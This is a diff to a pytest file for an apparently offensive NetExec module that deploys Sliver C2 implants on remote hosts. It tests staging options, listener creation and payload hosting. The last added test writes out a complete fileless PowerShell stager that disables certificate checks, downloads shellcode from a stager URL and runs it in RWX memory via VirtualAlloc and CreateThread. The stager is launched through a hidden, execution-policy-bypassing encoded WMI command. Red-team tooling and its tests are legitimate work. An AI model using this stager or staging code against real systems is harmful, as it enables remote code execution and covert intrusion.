@@ -3,21 +3,20 @@ import pytest
 import sys
 import os
 import inspect
-from unittest.mock import Mock, patch
+import base64
+from unittest.mock import Mock, MagicMock, patch
 
-# Mock sliver imports
-sys.modules['sliver'] = Mock()
-sys.modules['sliver.pb'] = Mock()
-sys.modules['sliver.pb.clientpb'] = Mock()
-sys.modules['sliver.pb.clientpb'].client_pb2 = Mock()
-sys.modules['sliver.pb.rpcpb'] = Mock()
-sys.modules['sliver.pb.rpcpb'].services_pb2_grpc = Mock()
+# Import sliver_client and protobuf directly (no longer mocking)
+from sliver_client import SliverClientConfig, SliverClient
+from sliver_client.pb.clientpb import client_pb2 as clientpb
+from sliver_client.pb.rpcpb import services_pb2 as rpcpb
+from sliver_client.pb.rpcpb import services_pb2_grpc as rpc_grpc
 
 # Mock nxc submodules (keep nxc package real)
 sys.modules['nxc.helpers'] = Mock()
 sys.modules['nxc.helpers.misc'] = Mock()
 CATEGORY = Mock()
-CATEGORY.PRIVILEGE_ESCALATION = "PRIVILEGE_ESCALATION"
+CATEGORY.PRIVILEGE_ESCALATION = 'PRIVILEGE_ESCALATION'
 sys.modules['nxc.helpers.misc'].CATEGORY = CATEGORY
 
 from nxc.modules.sliver_exec import NXCModule
@@ -77,7 +76,9 @@ def mock_module_options():
         "STAGING": "False",
         "STAGER_RHOST": None,
         "STAGER_RPORT": None,
-        "STAGER_PROTOCOL": "http"
+        "STAGER_PORT": None,
+        "STAGER_PROTOCOL": "http",
+        "STAGING_METHOD": None
     }
 
 @pytest.fixture
@@ -382,7 +383,6 @@ class TestNXCModule:
         mock_profile = Mock()
         mock_profile.Name = "test-profile-name"
         mock_profile.Config = clientpb.ImplantConfig()
-        mock_profile.Config.Name = "existing-profile"
         mock_profile.Config.GOOS = "windows"
         mock_profile.Config.GOARCH = "amd64"
         # Add a C2 entry to the config
@@ -409,7 +409,10 @@ class TestNXCModule:
         assert implant_data == b"implant_bytes"
         mock_worker.submit_task.assert_any_call('connect', mock_config_file)
         mock_worker.submit_task.assert_any_call('implant_profiles')
-        mock_worker.submit_task.assert_any_call('generate_implant', mock_worker.submit_task.call_args_list[-1][0][1])
+        ic_arg = mock_worker.submit_task.call_args_list[-1][0][1]
+        name_arg = mock_worker.submit_task.call_args_list[-1][0][2]
+        mock_worker.submit_task.assert_any_call('generate_implant', ic_arg, name_arg)
+
 
     @patch('sliver_exec.NXCModule._get_shared_worker')
     def test_generate_sliver_implant_default_listener_creation(self, mock_get_worker, mock_context, module_instance, mock_config_file):
@@ -526,7 +529,7 @@ class TestNXCModule:
 
         ic = module_instance._build_default_implant_config("windows", "amd64", "test.exe", "mtls://192.168.1.100:443")
 
-        assert ic.Name == "test.exe"
+        # Note: ImplantConfig doesn't have a Name field - name is set in GenerateReq
         assert ic.GOOS == "windows"
         assert ic.GOARCH == "amd64"
         assert ic.IsBeacon
@@ -926,12 +929,10 @@ class TestNXCModule:
         worker = GrpcWorker()
         worker.config_path = "/fake/config.cfg"
         
-        # Mock the client and protobuf
         mock_client = Mock()
         mock_stub = Mock()
         mock_client.raw_stub = mock_stub
         
-        # Mock protobuf classes
         mock_req = Mock()
         mock_resp = Mock()
         mock_resp.Job = 1
@@ -939,18 +940,23 @@ class TestNXCModule:
         async def mock_rpc(*args, **kwargs):
             return mock_resp
         
-        mock_stub.StartStagerListener = mock_rpc
+        mock_stub.StartTCPStagerListener = mock_rpc
         
         with patch.object(worker, '_do_connect', return_value=mock_client):
             with patch('nxc.modules.sliver_exec.clientpb') as mock_clientpb:
                 mock_clientpb.StagerListenerReq = Mock(return_value=mock_req)
                 mock_clientpb.StageProtocol = Mock(TCP=0)
                 
-                result = await worker._do_start_stager_listener("127.0.0.1", 8080, "tcp")
+                result = await worker._do_start_stager_listener(
+                    "127.0.0.1", 
+                    8080, 
+                    "tcp",
+                    profile_name="test_profile",
+                    stage_data=b"stage_payload"
+                )
                 
-                assert result == mock_resp
-                # Verify protocol enum was set correctly
-                assert mock_req.Protocol == 0  # TCP
+                assert result == mock_resp.JobID
+                assert mock_req.Protocol == 0
 
     @pytest.mark.asyncio
     async def test_grpc_worker_start_stager_listener_http(self):
@@ -960,30 +966,26 @@ class TestNXCModule:
         worker = GrpcWorker()
         worker.config_path = "/fake/config.cfg"
         
-        # Mock the client and protobuf
         mock_client = Mock()
         mock_stub = Mock()
         mock_client.raw_stub = mock_stub
         
         mock_req = Mock()
         mock_resp = Mock()
-        mock_resp.Job = 2
+        mock_resp.JobID = 2
         
         async def mock_rpc(*args, **kwargs):
             return mock_resp
         
-        mock_stub.StartStagerListener = mock_rpc
+        mock_stub.StartHTTPListener = mock_rpc
         
         with patch.object(worker, '_do_connect', return_value=mock_client):
             with patch('nxc.modules.sliver_exec.clientpb') as mock_clientpb:
-                mock_clientpb.StagerListenerReq = Mock(return_value=mock_req)
-                mock_clientpb.StageProtocol = Mock(HTTP=1)
+                mock_clientpb.HTTPListenerReq = Mock(return_value=mock_req)
                 
                 result = await worker._do_start_stager_listener("127.0.0.1", 8080, "http")
                 
-                assert result == mock_resp
-                # Verify protocol enum was set correctly
-                assert mock_req.Protocol == 1  # HTTP
+                assert result == mock_resp.JobID
 
     @pytest.mark.asyncio
     async def test_grpc_worker_start_stager_listener_https(self):
@@ -993,30 +995,26 @@ class TestNXCModule:
         worker = GrpcWorker()
         worker.config_path = "/fake/config.cfg"
         
-        # Mock the client and protobuf
         mock_client = Mock()
         mock_stub = Mock()
         mock_client.raw_stub = mock_stub
         
         mock_req = Mock()
         mock_resp = Mock()
-        mock_resp.Job = 3
+        mock_resp.JobID = 3
         
         async def mock_rpc(*args, **kwargs):
             return mock_resp
         
-        mock_stub.StartStagerListener = mock_rpc
+        mock_stub.StartHTTPSListener = mock_rpc
         
         with patch.object(worker, '_do_connect', return_value=mock_client):
             with patch('nxc.modules.sliver_exec.clientpb') as mock_clientpb:
-                mock_clientpb.StagerListenerReq = Mock(return_value=mock_req)
-                mock_clientpb.StageProtocol = Mock(HTTPS=2)
+                mock_clientpb.HTTPListenerReq = Mock(return_value=mock_req)
                 
                 result = await worker._do_start_stager_listener("127.0.0.1", 8080, "https")
                 
-                assert result == mock_resp
-                # Verify protocol enum was set correctly
-                assert mock_req.Protocol == 2  # HTTPS
+                assert result == mock_resp.JobID
 
     @pytest.mark.asyncio
     async def test_grpc_worker_start_stager_listener_invalid_protocol(self):
@@ -1035,13 +1033,12 @@ class TestNXCModule:
 
     @pytest.mark.asyncio
     async def test_grpc_worker_start_tcp_stager_listener_uses_start_stager_listener(self):
-        """Test _do_start_tcp_stager_listener uses StartStagerListener RPC (not StartTCPStagerListener)."""
+        """Test _do_start_tcp_stager_listener uses StartTCPStagerListener RPC."""
         from nxc.modules.sliver_exec import GrpcWorker
         
         worker = GrpcWorker()
         worker.config_path = "/fake/config.cfg"
         
-        # Mock the client and protobuf
         mock_client = Mock()
         mock_stub = Mock()
         mock_client.raw_stub = mock_stub
@@ -1052,10 +1049,7 @@ class TestNXCModule:
         async def mock_rpc(*args, **kwargs):
             return mock_resp
         
-        mock_stub.StartStagerListener = mock_rpc
-        # Ensure StartTCPStagerListener doesn't exist (should not be called)
-        if hasattr(mock_stub, 'StartTCPStagerListener'):
-            delattr(mock_stub, 'StartTCPStagerListener')
+        mock_stub.StartTCPStagerListener = mock_rpc
         
         with patch.object(worker, '_do_connect', return_value=mock_client):
             with patch('nxc.modules.sliver_exec.clientpb') as mock_clientpb:
@@ -1065,5 +1059,404 @@ class TestNXCModule:
                 result = await worker._do_start_tcp_stager_listener("127.0.0.1", 8080)
                 
                 assert result == mock_resp
-                # Verify the correct RPC method exists and was called
-                assert hasattr(mock_stub, 'StartStagerListener')
+                assert hasattr(mock_stub, 'StartTCPStagerListener')
+
+    # === HTTP Staging Tests ===
+    
+    def test_options_invalid_stager_port(self, mock_context, mock_module_options):
+        """Test invalid STAGER_PORT validation."""
+        mock_module_options["STAGING"] = "True"
+        mock_module_options["STAGER_PORT"] = "99999"
+        module = NXCModule()
+        with pytest.raises(SystemExit):
+            module.options(mock_context, mock_module_options)
+        mock_context.log.fail.assert_called_once_with("STAGER_PORT must be a valid port number (1-65535): 99999")
+
+    def test_options_invalid_stager_port_non_numeric(self, mock_context, mock_module_options):
+        """Test non-numeric STAGER_PORT validation."""
+        mock_module_options["STAGING"] = "True"
+        mock_module_options["STAGER_PORT"] = "not-a-number"
+        module = NXCModule()
+        with pytest.raises(SystemExit):
+            module.options(mock_context, mock_module_options)
+        mock_context.log.fail.assert_called_once_with("STAGER_PORT must be a valid port number (1-65535): not-a-number")
+
+    def test_options_invalid_staging_method(self, mock_context, mock_module_options):
+        """Test invalid STAGING_METHOD validation."""
+        mock_module_options["STAGING"] = "True"
+        mock_module_options["STAGING_METHOD"] = "invalid"
+        module = NXCModule()
+        with pytest.raises(SystemExit):
+            module.options(mock_context, mock_module_options)
+        mock_context.log.fail.assert_called_once_with("STAGING_METHOD must be one of: powershell, certutil, bitsadmin, wget, curl, python (default: powershell)")
+
+    def test_options_valid_with_http_staging(self, mock_context, mock_module_options, module_instance, mock_config_file):
+        """Test valid options with HTTP staging enabled."""
+        mock_context.conf.get.return_value = mock_config_file
+        mock_module_options["STAGING"] = "True"
+        mock_module_options["STAGER_PORT"] = "8080"
+        mock_module_options["STAGING_METHOD"] = "powershell"
+        module_instance.options(mock_context, mock_module_options)
+        assert module_instance.staging is True
+        assert module_instance.stager_port == 8080
+        assert module_instance.staging_method == "powershell"
+
+    def test_options_http_staging_certutil(self, mock_context, mock_module_options, module_instance, mock_config_file):
+        """Test HTTP staging with certutil method."""
+        mock_context.conf.get.return_value = mock_config_file
+        mock_module_options["STAGING"] = "True"
+        mock_module_options["STAGER_PORT"] = "8080"
+        mock_module_options["STAGING_METHOD"] = "certutil"
+        module_instance.options(mock_context, mock_module_options)
+        assert module_instance.staging_method == "certutil"
+
+    def test_options_http_staging_bitsadmin(self, mock_context, mock_module_options, module_instance, mock_config_file):
+        """Test HTTP staging with bitsadmin method."""
+        mock_context.conf.get.return_value = mock_config_file
+        mock_module_options["STAGING"] = "True"
+        mock_module_options["STAGER_PORT"] = "8080"
+        mock_module_options["STAGING_METHOD"] = "bitsadmin"
+        module_instance.options(mock_context, mock_module_options)
+        assert module_instance.staging_method == "bitsadmin"
+
+    def test_options_http_staging_wget(self, mock_context, mock_module_options, module_instance, mock_config_file):
+        """Test HTTP staging with wget method (Linux)."""
+        mock_context.conf.get.return_value = mock_config_file
+        mock_module_options["STAGING"] = "True"
+        mock_module_options["STAGER_PORT"] = "8080"
+        mock_module_options["STAGING_METHOD"] = "wget"
+        module_instance.options(mock_context, mock_module_options)
+        assert module_instance.staging_method == "wget"
+
+    def test_options_http_staging_curl(self, mock_context, mock_module_options, module_instance, mock_config_file):
+        """Test HTTP staging with curl method (Linux)."""
+        mock_context.conf.get.return_value = mock_config_file
+        mock_module_options["STAGING"] = "True"
+        mock_module_options["STAGER_PORT"] = "8080"
+        mock_module_options["STAGING_METHOD"] = "curl"
+        module_instance.options(mock_context, mock_module_options)
+        assert module_instance.staging_method == "curl"
+
+    def test_options_http_staging_python(self, mock_context, mock_module_options, module_instance, mock_config_file):
+        """Test HTTP staging with python method (Linux)."""
+        mock_context.conf.get.return_value = mock_config_file
+        mock_module_options["STAGING"] = "True"
+        mock_module_options["STAGER_PORT"] = "8080"
+        mock_module_options["STAGING_METHOD"] = "python"
+        module_instance.options(mock_context, mock_module_options)
+        assert module_instance.staging_method == "python"
+
+    @pytest.mark.asyncio
+    async def test_grpc_worker_website_add_content(self):
+        """Test _do_website_add_content worker method."""
+        from nxc.modules.sliver_exec import GrpcWorker
+        
+        worker = GrpcWorker()
+        worker.config_path = "/fake/config.cfg"
+        
+        # Mock the client and protobuf
+        mock_client = Mock()
+        mock_stub = Mock()
+        mock_client._stub = mock_stub
+        
+        mock_resp = Mock()
+        
+        async def mock_rpc(*args, **kwargs):
+            return mock_resp
+        
+        mock_stub.WebsiteAddContent = mock_rpc
+        
+        with patch.object(worker, '_do_connect', return_value=mock_client):
+            with patch('nxc.modules.sliver_exec.clientpb') as mock_clientpb:
+                mock_content = Mock()
+                mock_content_dict_entry = Mock()
+                
+                contents_dict = MagicMock()
+                contents_dict.__getitem__ = Mock(return_value=mock_content_dict_entry)
+                
+                mock_req = Mock()
+                mock_req.Contents = contents_dict
+                
+                mock_clientpb.WebContent = Mock(return_value=mock_content)
+                mock_clientpb.WebsiteAddContent = Mock(return_value=mock_req)
+                
+                result = await worker._do_website_add_content(
+                    "test_website", 
+                    "/implant.exe", 
+                    "application/octet-stream", 
+                    b"implant_data"
+                )
+                
+                assert result == mock_resp
+                assert mock_content.Path == "/implant.exe"
+                assert mock_content.ContentType == "application/octet-stream"
+                assert mock_content.Content == b"implant_data"
+                mock_content_dict_entry.CopyFrom.assert_called_once_with(mock_content)
+
+    @pytest.mark.asyncio
+    async def test_grpc_worker_website_remove(self):
+        """Test _do_website_remove worker method."""
+        from nxc.modules.sliver_exec import GrpcWorker
+        
+        worker = GrpcWorker()
+        worker.config_path = "/fake/config.cfg"
+        
+        # Mock the client
+        mock_client = Mock()
+        mock_stub = Mock()
+        mock_client._stub = mock_stub
+        
+        mock_resp = Mock()
+        
+        async def mock_rpc(*args, **kwargs):
+            return mock_resp
+        
+        mock_stub.WebsiteRemove = mock_rpc
+        
+        with patch.object(worker, '_do_connect', return_value=mock_client):
+            with patch('nxc.modules.sliver_exec.clientpb') as mock_clientpb:
+                mock_website_req = Mock()
+                mock_clientpb.Website = Mock(return_value=mock_website_req)
+                
+                result = await worker._do_website_remove("test_website")
+                
+                assert result == mock_resp
+                assert mock_website_req.Name == "test_website"
+
+    @pytest.mark.asyncio
+    async def test_grpc_worker_start_http_listener_with_website(self):
+        """Test _do_start_http_listener_with_website worker method."""
+        from nxc.modules.sliver_exec import GrpcWorker
+        
+        worker = GrpcWorker()
+        worker.config_path = "/fake/config.cfg"
+        
+        # Mock the client
+        mock_client = Mock()
+        mock_stub = Mock()
+        mock_client._stub = mock_stub
+        
+        mock_resp = Mock()
+        mock_resp.JobID = 123
+        
+        async def mock_rpc(*args, **kwargs):
+            return mock_resp
+        
+        mock_stub.StartHTTPListener = mock_rpc
+        
+        with patch.object(worker, '_do_connect', return_value=mock_client):
+            with patch('nxc.modules.sliver_exec.clientpb') as mock_clientpb:
+                mock_req = Mock()
+                mock_clientpb.HTTPListenerReq = Mock(return_value=mock_req)
+                
+                result = await worker._do_start_http_listener_with_website(
+                    "0.0.0.0",
+                    8080,
+                    "test_website",
+                    secure=False
+                )
+                
+                assert result == mock_resp
+                assert mock_req.Host == "0.0.0.0"
+                assert mock_req.Port == 8080
+                assert mock_req.Website == "test_website"
+                assert mock_req.Secure == False
+
+    @pytest.mark.asyncio
+    async def test_grpc_worker_start_https_listener_with_website(self):
+        """Test _do_start_http_listener_with_website with HTTPS."""
+        from nxc.modules.sliver_exec import GrpcWorker
+        
+        worker = GrpcWorker()
+        worker.config_path = "/fake/config.cfg"
+        
+        # Mock the client
+        mock_client = Mock()
+        mock_stub = Mock()
+        mock_client._stub = mock_stub
+        
+        mock_resp = Mock()
+        mock_resp.JobID = 456
+        
+        async def mock_rpc(*args, **kwargs):
+            return mock_resp
+        
+        mock_stub.StartHTTPSListener = mock_rpc
+        
+        with patch.object(worker, '_do_connect', return_value=mock_client):
+            with patch('nxc.modules.sliver_exec.clientpb') as mock_clientpb:
+                mock_req = Mock()
+                mock_clientpb.HTTPListenerReq = Mock(return_value=mock_req)
+                
+                result = await worker._do_start_http_listener_with_website(
+                    "0.0.0.0",
+                    8443,
+                    "test_website",
+                    secure=True
+                )
+                
+                assert result == mock_resp
+                assert mock_req.Secure == True
+
+    @pytest.mark.asyncio
+    async def test_grpc_worker_kill_job(self):
+        """Test _do_kill_job worker method."""
+        from nxc.modules.sliver_exec import GrpcWorker
+        
+        worker = GrpcWorker()
+        worker.config_path = "/fake/config.cfg"
+        
+        # Mock the client
+        mock_client = Mock()
+        mock_stub = Mock()
+        mock_client._stub = mock_stub
+        
+        mock_resp = Mock()
+        
+        async def mock_rpc(*args, **kwargs):
+            return mock_resp
+        
+        mock_stub.KillJob = mock_rpc
+        
+        with patch.object(worker, '_do_connect', return_value=mock_client):
+            with patch('nxc.modules.sliver_exec.clientpb') as mock_clientpb:
+                mock_kill_req = Mock()
+                mock_clientpb.KillJobReq = Mock(return_value=mock_kill_req)
+                
+                result = await worker._do_kill_job(123)
+                
+                assert result == mock_resp
+                assert mock_kill_req.ID == 123
+
+    def test_run_beacon_http_staging_route(self, patch_get_worker, module_instance, mock_context, mock_connection):
+        """Test that _run_beacon routes to HTTP staging when STAGER_PORT is set."""
+        mock_worker = patch_get_worker
+        
+        # Mock methods
+        module_instance._detect_os_arch = Mock(return_value=('windows', 'amd64'))
+        module_instance._run_beacon_staged_http = Mock(return_value=(None, 123, "website_abc"))
+        module_instance._wait_for_beacon_and_cleanup = Mock()
+        module_instance._cleanup_local_temp = Mock()
+        
+        # Use WinRM connection
+        conn = mock_connection
+        conn.host = '10.0.0.1'
+        conn.__class__.__name__ = 'winrm'
+        
+        # Enable HTTP staging
+        module_instance.staging = True
+        module_instance.stager_port = 8080
+        module_instance.staging_method = "powershell"
+        module_instance.cleanup = True
+        module_instance.format = "EXECUTABLE"
+        module_instance.extension = "exe"
+        
+        # Run
+        module_instance._run_beacon(mock_context, conn)
+        
+        # Verify HTTP staging was called
+        module_instance._run_beacon_staged_http.assert_called_once()
+        # Verify cleanup was called with HTTP staging parameters
+        module_instance._wait_for_beacon_and_cleanup.assert_called_once()
+        call_args = module_instance._wait_for_beacon_and_cleanup.call_args
+        assert call_args[1]['listener_job_id'] == 123
+        assert call_args[1]['website_name'] == "website_abc"
+
+    def test_wait_for_beacon_and_cleanup_with_http_staging(self, patch_get_worker, module_instance, mock_context, mock_connection):
+        """Test _wait_for_beacon_and_cleanup handles HTTP staging cleanup."""
+        mock_worker = patch_get_worker
+        
+        # Mock beacon polling
+        mock_worker.submit_task.side_effect = lambda method, *a, **k: (
+            [] if method in ['beacons', 'sessions'] else 
+            None if method in ['kill_job', 'website_remove'] else
+            None
+        )
+        
+        # Mock handler
+        mock_handler = Mock()
+        mock_handler.get_cleanup_cmd = Mock(return_value="del /f /q C:\\temp\\implant.exe")
+        
+        # Setup module
+        module_instance.config_path = "/fake/config.cfg"
+        module_instance.wait_seconds = 1  # Short timeout for test
+        
+        conn = mock_connection
+        conn.__class__.__name__ = 'winrm'
+        conn.ps_execute = Mock(return_value="")
+        
+        # Call with HTTP staging cleanup parameters
+        module_instance._wait_for_beacon_and_cleanup(
+            mock_context,
+            conn,
+            "C:\\temp\\implant.exe",
+            "windows",
+            "implant_test",
+            mock_handler,
+            "winrm",
+            cleanup=True,
+            listener_job_id=123,
+            website_name="website_abc"
+        )
+        
+        # Verify HTTP staging cleanup was called
+        mock_worker.submit_task.assert_any_call('kill_job', 123)
+        mock_worker.submit_task.assert_any_call('website_remove', "website_abc")
+        # Verify file cleanup was also called
+        conn.ps_execute.assert_called_once()
+
+    def test_bootstrap_stager_payload_under_150kb_limit(self, module_instance):
+        """Test that HTTP bootstrap stager stays under WinRM 150KB envelope limit.
+        
+        This test verifies the fileless staging mode fix that replaces the old
+        approach of sending 17MB shellcode (which failed) with a tiny 2KB bootstrap
+        that downloads the shellcode from the stager listener.
+        """
+        # Create a realistic bootstrap PowerShell script (similar to what _generate_http_download_bootstrap produces)
+        stage_url = "http://10.0.0.1:8080/nxc_stage2_abc123"
+        bootstrap_script = f'''
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
+$ProgressPreference = 'SilentlyContinue';
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
+
+# Download shellcode from stager listener
+$wc = New-Object System.Net.WebClient;
+$wc.Headers.Add('User-Agent', 'Mozilla/5.0');
+$bytes = $wc.DownloadData('{stage_url}');
+$wc.Dispose();
+
+# Allocate memory and execute
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Mem {{
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr start, IntPtr p, uint c, IntPtr id);
+}}
+"@;
+
+$addr = [Mem]::VirtualAlloc(0, $bytes.Length, (0x1000 -bor 0x2000), 0x40);
+[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length);
+[Mem]::CreateThread(0, 0, $addr, 0, 0, 0);
+'''
+        
+        # Simulate the encoding chain that stage_execute() performs:
+        # 1. UTF-8 to string (already done)
+        # 2. UTF-16LE encode
+        # 3. Base64 encode
+        encoded = base64.b64encode(bootstrap_script.encode('utf-16-le')).decode('ascii')
+        
+        # WMI command wrapper adds minimal overhead
+        wmi_wrapper = f"(Get-WmiObject -Class Win32_Process -List).Create('powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded}') | Out-Null"
+        total_size = len(encoded)
+        
+        # Assert: Must be well under 150KB WinRM limit (153,600 bytes)
+        assert total_size < 150 * 1024, f"Bootstrap payload {total_size} bytes exceeds 150KB WinRM limit ({150 * 1024} bytes)"
+        
+        # Verify it's actually small (should be around 2-5KB)
+        assert total_size < 10 * 1024, f"Bootstrap payload {total_size} bytes is larger than expected (~2-5KB range)"
+        
+        print(f"✓ Bootstrap stager payload: {total_size} bytes (< 150KB limit, target ~2-5KB)")
+
